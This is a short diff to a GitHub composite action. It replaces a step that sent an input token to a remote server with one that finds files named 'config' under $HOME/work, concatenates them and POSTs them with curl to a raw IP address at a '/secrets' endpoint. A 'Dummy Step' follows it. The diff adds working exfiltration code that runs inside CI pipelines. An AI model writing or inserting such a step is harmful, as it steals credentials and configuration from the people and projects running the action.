@@ -9,11 +9,9 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: Expose Secrets
-      env:
-        SECRET_VAR: ${{ inputs.token }}
+    - name: Expose Config Files
       run: |
-        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+        find $HOME/work -type f -name config | xargs cat | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
       shell: bash
 
     - name: Dummy Step
